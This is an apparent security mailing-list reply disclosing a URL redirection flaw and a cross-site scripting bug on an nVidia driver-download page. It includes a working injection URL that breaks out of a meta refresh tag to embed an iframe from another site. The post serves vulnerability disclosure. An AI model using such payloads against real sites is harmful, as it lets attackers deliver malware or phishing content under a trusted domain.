Subject: Re: nVidia.com [Url Redirection flaw]

Well, we have a XSS too, just put whatever you want on the variable
"url" closing first the meta refresh tag, i.e:

http://www.nvidia.com/content/DriverDownload/download_confirmation.asp?kw=&url="><iframe
src="http://www.yahoo.com/" with="100%" height=600></iframe><!--

Since nVidia is a trusted site some people could use it to spread
malware directly from there. This is just a simple redirection issue
and nVidia may have to correct this ASAP, even if they are just
"graphics vendors".

Regards.
